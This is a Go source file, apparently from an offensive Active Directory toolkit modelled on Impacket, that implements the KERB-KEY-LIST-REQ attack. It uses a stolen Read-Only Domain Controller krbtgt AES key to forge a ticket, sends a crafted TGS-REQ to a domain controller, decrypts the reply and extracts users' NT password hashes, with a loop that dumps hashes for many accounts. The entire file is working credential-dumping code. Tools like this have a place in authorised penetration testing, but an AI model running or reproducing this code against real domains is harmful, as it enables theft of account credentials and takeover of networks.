// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Jacob Paullus

package kerberos

import (
	"encoding/asn1"
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"math/rand"
	"strings"
	"time"

	"github.com/jcmturner/gokrb5/v8/crypto"
	"github.com/jcmturner/gokrb5/v8/messages"
)

// PA-DATA type for KERB-KEY-LIST-REQ (MS-KILE 2.2.11)
const PA_KERB_KEY_LIST_REQ = 161

// PA-DATA type for KERB-KEY-LIST-REP (MS-KILE 2.2.12)
const PA_KERB_KEY_LIST_REP = 162

// KerbKeyListEntry represents a single entry in KERB-KEY-LIST-REP
type KerbKeyListEntry struct {
	KeyType  int32  `asn1:"explicit,tag:0"`
	KeyValue []byte `asn1:"explicit,tag:1"`
}

// KeyListSecrets provides functionality for the KERB-KEY-LIST-REQ attack
// to dump secrets from an RODC (Read-Only Domain Controller).
type KeyListSecrets struct {
	Domain           string
	KDCHost          string
	RODCKeyVersionNo int    // RODC krbtgt account number (e.g., 20000)
	RODCKey          []byte // AES256 key of the RODC krbtgt account
}

// NewKeyListSecrets creates a new KeyListSecrets instance.
func NewKeyListSecrets(domain, kdcHost string, rodcNo int, rodcKeyHex string) (*KeyListSecrets, error) {
	rodcKey, err := hex.DecodeString(rodcKeyHex)
	if err != nil {
		return nil, fmt.Errorf("invalid RODC key (not hex): %v", err)
	}
	if len(rodcKey) != 32 {
		return nil, fmt.Errorf("RODC key must be 32 bytes (AES256), got %d bytes", len(rodcKey))
	}

	return &KeyListSecrets{
		Domain:           strings.ToUpper(domain),
		KDCHost:          kdcHost,
		RODCKeyVersionNo: rodcNo,
		RODCKey:          rodcKey,
	}, nil
}

// GetUserKey uses the KERB-KEY-LIST-REQ attack to retrieve the NT hash.
func (k *KeyListSecrets) GetUserKey(username string) (string, error) {
	// Generate a random 32-byte session key (ASCII letters like Impacket)
	const letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	sessionKey := make([]byte, 32)
	for i := range sessionKey {
		sessionKey[i] = letters[rand.Intn(len(letters))]
	}

	// Build the encrypted EncTicketPart
	now := time.Now().UTC()
	encTicketPartBytes := buildEncTicketPart(username, k.Domain, sessionKey, now)

	// Encrypt with RODC key (key usage 2)
	et, err := crypto.GetEtype(18)
	if err != nil {
		return "", fmt.Errorf("failed to get AES256 etype: %v", err)
	}
	_, ticketCipher, err := et.EncryptMessage(k.RODCKey, encTicketPartBytes, 2)
	if err != nil {
		return "", fmt.Errorf("failed to encrypt EncTicketPart: %v", err)
	}

	// Build the partial TGT ticket (raw ASN.1)
	ticketBytes := buildTicket(k.Domain, k.RODCKeyVersionNo, ticketCipher)

	// Build the authenticator and encrypt it
	authBytes := buildAuthenticator(username, k.Domain, now)
	_, authCipher, err := et.EncryptMessage(sessionKey, authBytes, 7)
	if err != nil {
		return "", fmt.Errorf("failed to encrypt authenticator: %v", err)
	}

	// Build AP-REQ
	apReqBytes := buildAPReq(ticketBytes, authCipher)

	// Build PA-KERB-KEY-LIST-REQ
	keyListReq, _ := asn1.Marshal([]int{23})

	// Build TGS-REQ body
	reqBodyBytes := buildTGSReqBody(k.Domain, now)

	// Build full TGS-REQ
	tgsReqBytes := buildTGSReq(apReqBytes, keyListReq, reqBodyBytes)

	// Send to KDC
	resp, err := sendKDCRequest(k.KDCHost, tgsReqBytes)
	if err != nil {
		return "", err
	}

	return k.extractKey(resp, sessionKey)
}

// ---- Raw ASN.1 builders matching Impacket exactly ----

func buildEncTicketPart(username, realm string, sessionKey []byte, now time.Time) []byte {
	endTime := now.Add(120 * 24 * time.Hour)

	// flags [0]: forwardable(1), renewable(8), enc_pa_rep(15) = 0x40810000
	flags := wrapExplicit(0, mustMarshal(asn1.BitString{Bytes: []byte{0x40, 0x81, 0x00, 0x00}, BitLength: 32}))

	// key [1]: EncryptionKey { keytype [0] INTEGER, keyvalue [1] OCTET STRING }
	key := wrapExplicit(1, wrapSeq(cat(
		wrapExplicit(0, mustMarshal(asn1.RawValue{Tag: asn1.TagInteger, Class: asn1.ClassUniversal, Bytes: []byte{18}})),
		wrapExplicit(1, mustMarshal(asn1.RawValue{Tag: asn1.TagOctetString, Class: asn1.ClassUniversal, Bytes: sessionKey})),
	)))

	// crealm [2]: GeneralString
	crealm := wrapExplicit(2, marshalGeneralString(realm))

	// cname [3]: PrincipalName { name-type [0] INTEGER, name-string [1] SEQUENCE OF GeneralString }
	cname := wrapExplicit(3, wrapSeq(cat(
		wrapExplicit(0, mustMarshal(asn1.RawValue{Tag: asn1.TagInteger, Class: asn1.ClassUniversal, Bytes: []byte{1}})),
		wrapExplicit(1, wrapSeq(marshalGeneralString(username))),
	)))

	// transited [4]: TransitedEncoding { tr-type [0] INTEGER, contents [1] OCTET STRING }
	transited := wrapExplicit(4, wrapSeq(cat(
		wrapExplicit(0, mustMarshal(asn1.RawValue{Tag: asn1.TagInteger, Class: asn1.ClassUniversal, Bytes: []byte{0}})),
		wrapExplicit(1, mustMarshal(asn1.RawValue{Tag: asn1.TagOctetString, Class: asn1.ClassUniversal, Bytes: []byte{}})),
	)))

	// authtime [5], starttime [6], endtime [7], renew-till [8]: GeneralizedTime
	authtime := wrapExplicit(5, marshalGeneralizedTime(now))
	starttime := wrapExplicit(6, marshalGeneralizedTime(now))
	endtime := wrapExplicit(7, marshalGeneralizedTime(endTime))
	renewtill := wrapExplicit(8, marshalGeneralizedTime(endTime))

	// authorization-data [10]: SEQUENCE OF AuthorizationData (empty)
	authdata := wrapExplicit(10, wrapSeq([]byte{}))

	inner := wrapSeq(cat(flags, key, crealm, cname, transited, authtime, starttime, endtime, renewtill, authdata))
	return wrapApp(3, inner)
}

func buildTicket(realm string, rodcNo int, cipher []byte) []byte {
	tktVNO := wrapExplicit(0, mustMarshal(asn1.RawValue{Tag: asn1.TagInteger, Class: asn1.ClassUniversal, Bytes: []byte{5}}))
	realmField := wrapExplicit(1, marshalGeneralString(realm))

	// sname: PrincipalName (NT_SRV_INST, ["krbtgt", realm])
	sname := wrapExplicit(2, wrapSeq(cat(
		wrapExplicit(0, mustMarshal(asn1.RawValue{Tag: asn1.TagInteger, Class: asn1.ClassUniversal, Bytes: []byte{2}})),
		wrapExplicit(1, wrapSeq(cat(
			marshalGeneralString("krbtgt"),
			marshalGeneralString(realm),
		))),
	)))

	// enc-part: EncryptedData with KVNO
	encPart := wrapExplicit(3, buildEncryptedData(18, rodcNo<<16, cipher, true))

	inner := wrapSeq(cat(tktVNO, realmField, sname, encPart))
	return wrapApp(1, inner)
}

func buildAuthenticator(username, realm string, now time.Time) []byte {
	avno := wrapExplicit(0, mustMarshal(asn1.RawValue{Tag: asn1.TagInteger, Class: asn1.ClassUniversal, Bytes: []byte{5}}))
	crealm := wrapExplicit(1, marshalGeneralString(realm))

	// cname: PrincipalName (NT_PRINCIPAL, [username])
	cname := wrapExplicit(2, wrapSeq(cat(
		wrapExplicit(0, mustMarshal(asn1.RawValue{Tag: asn1.TagInteger, Class: asn1.ClassUniversal, Bytes: []byte{1}})),
		wrapExplicit(1, wrapSeq(marshalGeneralString(username))),
	)))

	cusec := wrapExplicit(4, mustMarshal(asn1.RawValue{Tag: asn1.TagInteger, Class: asn1.ClassUniversal, Bytes: encodeInt(now.Nanosecond() / 1000)}))
	ctime := wrapExplicit(5, marshalGeneralizedTime(now))

	inner := wrapSeq(cat(avno, crealm, cname, cusec, ctime))
	return wrapApp(2, inner)
}

func buildAPReq(ticketBytes, authCipher []byte) []byte {
	// AP-REQ ::= [APPLICATION 14] SEQUENCE {
	//   pvno [0] INTEGER,
	//   msg-type [1] INTEGER,
	//   ap-options [2] BIT STRING,
	//   ticket [3] Ticket,
	//   authenticator [4] EncryptedData
	// }

	pvno := wrapExplicit(0, mustMarshal(asn1.RawValue{Tag: asn1.TagInteger, Class: asn1.ClassUniversal, Bytes: []byte{5}}))
	msgType := wrapExplicit(1, mustMarshal(asn1.RawValue{Tag: asn1.TagInteger, Class: asn1.ClassUniversal, Bytes: []byte{14}}))
	apOptions := wrapExplicit(2, mustMarshal(asn1.BitString{Bytes: []byte{0, 0, 0, 0}, BitLength: 32}))
	ticketField := wrapExplicit(3, ticketBytes)

	// EncryptedData for authenticator
	encData := buildEncryptedData(18, 0, authCipher, false)
	authField := wrapExplicit(4, encData)

	seq := cat(pvno, msgType, apOptions, ticketField, authField)
	seqWrapped := wrapSeq(seq)
	return wrapApp(14, seqWrapped)
}

func buildEncryptedData(etype, kvno int, cipher []byte, includeKVNO bool) []byte {
	etypeField := wrapExplicit(0, mustMarshal(asn1.RawValue{Tag: asn1.TagInteger, Class: asn1.ClassUniversal, Bytes: encodeInt(etype)}))
	var kvnoField []byte
	if includeKVNO {
		kvnoField = wrapExplicit(1, mustMarshal(asn1.RawValue{Tag: asn1.TagInteger, Class: asn1.ClassUniversal, Bytes: encodeInt(kvno)}))
	}
	cipherField := wrapExplicit(2, mustMarshal(asn1.RawValue{Tag: asn1.TagOctetString, Class: asn1.ClassUniversal, Bytes: cipher}))
	return wrapSeq(cat(etypeField, kvnoField, cipherField))
}

func buildTGSReqBody(realm string, now time.Time) []byte {
	// KDC-REQ-BODY
	kdcOptions := wrapExplicit(0, mustMarshal(asn1.BitString{Bytes: []byte{0x00, 0x01, 0x00, 0x00}, BitLength: 32})) // canonicalize
	realmField := wrapExplicit(2, marshalGeneralString(realm))

	// sname: krbtgt/REALM
	snameInner := cat(
		wrapExplicit(0, mustMarshal(asn1.RawValue{Tag: asn1.TagInteger, Class: asn1.ClassUniversal, Bytes: []byte{2}})), // NT_SRV_INST
		wrapExplicit(1, wrapSeq(cat(marshalGeneralString("krbtgt"), marshalGeneralString(realm)))),
	)
	snameField := wrapExplicit(3, wrapSeq(snameInner))

	till := now.Add(24 * time.Hour)
	tillField := wrapExplicit(5, marshalGeneralizedTime(till))

	nonce := rand.Int31()
	nonceField := wrapExplicit(7, mustMarshal(asn1.RawValue{Tag: asn1.TagInteger, Class: asn1.ClassUniversal, Bytes: encodeInt(int(nonce))}))

	// etype: 18, 17, 23, 24, -135 (match Impacket exactly)
	etypeSeq := wrapSeq(cat(
		mustMarshal(asn1.RawValue{Tag: asn1.TagInteger, Class: asn1.ClassUniversal, Bytes: []byte{18}}),
		mustMarshal(asn1.RawValue{Tag: asn1.TagInteger, Class: asn1.ClassUniversal, Bytes: []byte{17}}),
		mustMarshal(asn1.RawValue{Tag: asn1.TagInteger, Class: asn1.ClassUniversal, Bytes: []byte{23}}),
		mustMarshal(asn1.RawValue{Tag: asn1.TagInteger, Class: asn1.ClassUniversal, Bytes: []byte{24}}),
		mustMarshal(asn1.RawValue{Tag: asn1.TagInteger, Class: asn1.ClassUniversal, Bytes: encodeInt(-135)}), // rc4_hmac_old_exp
	))
	etypeField := wrapExplicit(8, etypeSeq)

	return wrapSeq(cat(kdcOptions, realmField, snameField, tillField, nonceField, etypeField))
}

func buildTGSReq(apReqBytes, keyListReq, reqBodyBytes []byte) []byte {
	// PA-DATA[0]: PA-TGS-REQ (type 1) = AP-REQ
	paData0 := wrapSeq(cat(
		wrapExplicit(1, mustMarshal(asn1.RawValue{Tag: asn1.TagInteger, Class: asn1.ClassUniversal, Bytes: []byte{1}})),
		wrapExplicit(2, mustMarshal(asn1.RawValue{Tag: asn1.TagOctetString, Class: asn1.ClassUniversal, Bytes: apReqBytes})),
	))

	// PA-DATA[1]: PA-KERB-KEY-LIST-REQ (type 161)
	paData1 := wrapSeq(cat(
		wrapExplicit(1, mustMarshal(asn1.RawValue{Tag: asn1.TagInteger, Class: asn1.ClassUniversal, Bytes: encodeInt(PA_KERB_KEY_LIST_REQ)})),
		wrapExplicit(2, mustMarshal(asn1.RawValue{Tag: asn1.TagOctetString, Class: asn1.ClassUniversal, Bytes: keyListReq})),
	))

	pvno := wrapExplicit(1, mustMarshal(asn1.RawValue{Tag: asn1.TagInteger, Class: asn1.ClassUniversal, Bytes: []byte{5}}))
	msgType := wrapExplicit(2, mustMarshal(asn1.RawValue{Tag: asn1.TagInteger, Class: asn1.ClassUniversal, Bytes: []byte{12}}))
	padata := wrapExplicit(3, wrapSeq(cat(paData0, paData1)))
	reqBody := wrapExplicit(4, reqBodyBytes)

	seq := cat(pvno, msgType, padata, reqBody)
	return wrapApp(12, wrapSeq(seq))
}

// ---- ASN.1 helpers ----

// wrapApp wraps data with an explicit APPLICATION tag.
// Kerberos ASN.1 module uses EXPLICIT TAGS (DEFINITIONS EXPLICIT TAGS ::=).
func wrapApp(tag int, data []byte) []byte {
	return wrapTag(0x60|tag, data)
}

func marshalGeneralizedTime(t time.Time) []byte {
	return mustMarshal(asn1.RawValue{Tag: asn1.TagGeneralizedTime, Class: asn1.ClassUniversal, Bytes: []byte(t.UTC().Format("20060102150405Z"))})
}

func wrapExplicit(tag int, data []byte) []byte {
	return wrapTag(0xa0|tag, data)
}

func wrapSeq(data []byte) []byte {
	return wrapTag(0x30, data)
}

func wrapTag(tag int, data []byte) []byte {
	if tag > 0xFF {
		// Two-byte tag not needed for our cases
		panic("tag too large")
	}
	l := len(data)
	var buf []byte
	if tag > 30 && tag < 0x60 {
		// high tag number form
		buf = append(buf, byte(tag))
	} else {
		buf = append(buf, byte(tag))
	}
	buf = append(buf, encodeLength(l)...)
	buf = append(buf, data...)
	return buf
}

func encodeLength(l int) []byte {
	if l < 0x80 {
		return []byte{byte(l)}
	} else if l < 0x100 {
		return []byte{0x81, byte(l)}
	} else if l < 0x10000 {
		return []byte{0x82, byte(l >> 8), byte(l)}
	}
	return []byte{0x83, byte(l >> 16), byte(l >> 8), byte(l)}
}

func encodeInt(v int) []byte {
	if v == 0 {
		return []byte{0}
	}
	buf := make([]byte, 4)
	binary.BigEndian.PutUint32(buf, uint32(v))
	i := 0
	if v > 0 {
		// Trim leading zeros, keep sign bit clear
		for i < 3 && buf[i] == 0 && buf[i+1] < 0x80 {
			i++
		}
	} else {
		// Trim leading 0xFF bytes, keep sign bit set
		for i < 3 && buf[i] == 0xFF && buf[i+1] >= 0x80 {
			i++
		}
	}
	return buf[i:]
}

func cat(parts ...[]byte) []byte {
	var result []byte
	for _, p := range parts {
		result = append(result, p...)
	}
	return result
}

func mustMarshal(v interface{}) []byte {
	b, err := asn1.Marshal(v)
	if err != nil {
		panic(err)
	}
	return b
}

// ---- Response parsing ----

func (k *KeyListSecrets) extractKey(respBuf []byte, sessionKey []byte) (string, error) {
	// Try as KRB-ERROR first
	var krbErr messages.KRBError
	if err := krbErr.Unmarshal(respBuf); err == nil && krbErr.ErrorCode != 0 {
		return "", translateKeyListKRBError(krbErr)
	}

	// Parse TGS-REP
	var tgsRep messages.TGSRep
	if err := tgsRep.Unmarshal(respBuf); err != nil {
		return "", fmt.Errorf("failed to unmarshal TGS-REP: %v", err)
	}

	// Decrypt enc-part (key usage 8 for TGS-REP)
	et, err := crypto.GetEtype(tgsRep.EncPart.EType)
	if err != nil {
		return "", fmt.Errorf("unsupported etype %d: %v", tgsRep.EncPart.EType, err)
	}

	decrypted, err := et.DecryptMessage(sessionKey, tgsRep.EncPart.Cipher, 8)
	if err != nil {
		return "", fmt.Errorf("failed to decrypt TGS-REP: %v", err)
	}

	// Parse EncKDCRepPart
	var encPart messages.EncKDCRepPart
	if err := encPart.Unmarshal(decrypted); err == nil {
		for _, padata := range encPart.EncPAData {
			if padata.PADataType == PA_KERB_KEY_LIST_REP {
				return parseKeyListRep(padata.PADataValue)
			}
		}
	}

	// gokrb5 may not parse encPAData correctly - try raw extraction
	return extractKeyFromRaw(decrypted)
}

// extractKeyFromRaw finds KERB-KEY-LIST-REP (PA type 162) by scanning decrypted bytes
func extractKeyFromRaw(data []byte) (string, error) {
	// PA-DATA type 162 = 0x00A2 as DER INTEGER: 02 02 00 a2
	for i := 0; i < len(data)-20; i++ {
		if data[i] == 0x02 && data[i+1] == 0x02 && data[i+2] == 0x00 && data[i+3] == 0xa2 {
			for j := i + 4; j < len(data)-4; j++ {
				if data[j] == 0xa2 {
					vLen := int(data[j+1])
					if j+2+vLen > len(data) {
						continue
					}
					if data[j+2] == 0x04 {
						oLen := int(data[j+3])
						if j+4+oLen > len(data) {
							continue
						}
						return parseKeyListRep(data[j+4 : j+4+oLen])
					}
				}
			}
		}
	}
	return "", fmt.Errorf("KERB-KEY-LIST-REP not found in response (user may not be allowed to replicate)")
}

func parseKeyListRep(data []byte) (string, error) {
	var keys []KerbKeyListEntry
	_, err := asn1.Unmarshal(data, &keys)
	if err != nil {
		return parseKeyListRepRaw(data)
	}

	for _, key := range keys {
		if key.KeyType == 23 && len(key.KeyValue) == 16 {
			return hex.EncodeToString(key.KeyValue), nil
		}
	}

	if len(keys) > 0 && len(keys[0].KeyValue) > 0 {
		return hex.EncodeToString(keys[0].KeyValue), nil
	}

	return "", fmt.Errorf("no valid key found in KERB-KEY-LIST-REP")
}

func parseKeyListRepRaw(data []byte) (string, error) {
	if len(data) < 4 {
		return "", fmt.Errorf("KERB-KEY-LIST-REP too short")
	}

	offset := 0
	if data[offset] != 0x30 {
		return "", fmt.Errorf("expected SEQUENCE tag, got 0x%02x", data[offset])
	}
	offset++
	if data[offset] < 0x80 {
		offset++
	} else if data[offset] == 0x81 {
		offset += 2
	} else if data[offset] == 0x82 {
		offset += 3
	} else {
		return "", fmt.Errorf("unsupported length encoding")
	}

	for offset < len(data)-10 {
		if data[offset] != 0x30 {
			offset++
			continue
		}
		entryStart := offset
		offset++
		entryLen := 0
		if data[offset] < 0x80 {
			entryLen = int(data[offset])
			offset++
		} else if data[offset] == 0x81 {
			entryLen = int(data[offset+1])
			offset += 2
		} else {
			offset++
			continue
		}
		if offset+entryLen > len(data) {
			break
		}
		entryData := data[offset : offset+entryLen]
		if len(entryData) < 6 || entryData[0] != 0xa0 {
			offset = entryStart + 1
			continue
		}
		keyTypeOffset := 2
		if entryData[keyTypeOffset] != 0x02 {
			offset = entryStart + 1
			continue
		}
		keyTypeLen := int(entryData[keyTypeOffset+1])
		keyType := 0
		for i := 0; i < keyTypeLen; i++ {
			keyType = (keyType << 8) | int(entryData[keyTypeOffset+2+i])
		}
		keyValueStart := keyTypeOffset + 2 + keyTypeLen
		if keyValueStart >= len(entryData) || entryData[keyValueStart] != 0xa1 {
			offset = entryStart + 1
			continue
		}
		octetOffset := keyValueStart + 2
		if octetOffset >= len(entryData) || entryData[octetOffset] != 0x04 {
			offset = entryStart + 1
			continue
		}
		keyValueLen := int(entryData[octetOffset+1])
		keyValue := entryData[octetOffset+2 : octetOffset+2+keyValueLen]
		if keyType == 23 && len(keyValue) == 16 {
			return hex.EncodeToString(keyValue), nil
		}
		offset += entryLen
	}
	return "", fmt.Errorf("no RC4-HMAC key found in KERB-KEY-LIST-REP")
}

func translateKeyListKRBError(e messages.KRBError) error {
	code := e.ErrorCode
	switch code {
	case 6:
		return fmt.Errorf("user not found (KDC_ERR_C_PRINCIPAL_UNKNOWN)")
	case 9:
		return fmt.Errorf("client credentials revoked - user not allowed to have passwords replicated in RODCs (KDC_ERR_TGT_REVOKED)")
	case 18:
		return fmt.Errorf("client credentials revoked - user not allowed to have passwords replicated in RODCs (KDC_ERR_CLIENT_REVOKED)")
	case 23:
		return fmt.Errorf("user password has expired (KDC_ERR_KEY_EXPIRED)")
	case 7:
		return fmt.Errorf("RODC krbtgt not found - check the RODC account number (KDC_ERR_S_PRINCIPAL_UNKNOWN)")
	case 31:
		return fmt.Errorf("bad integrity - check the RODC AES key (KRB_AP_ERR_BAD_INTEGRITY)")
	case 68:
		return fmt.Errorf("wrong realm (KDC_ERR_WRONG_REALM)")
	default:
		return translateKRBError(e)
	}
}

type KeyListResult struct {
	Username string
	RID      string
	NTHash   string
	Error    error
}

func (k *KeyListSecrets) DumpUsers(users []string) []KeyListResult {
	results := make([]KeyListResult, 0, len(users))
	for _, userEntry := range users {
		parts := strings.SplitN(userEntry, ":", 2)
		username := parts[0]
		rid := "N/A"
		if len(parts) > 1 {
			rid = parts[1]
		}
		ntHash, err := k.GetUserKey(username)
		results = append(results, KeyListResult{Username: username, RID: rid, NTHash: ntHash, Error: err})
	}
	return results
}
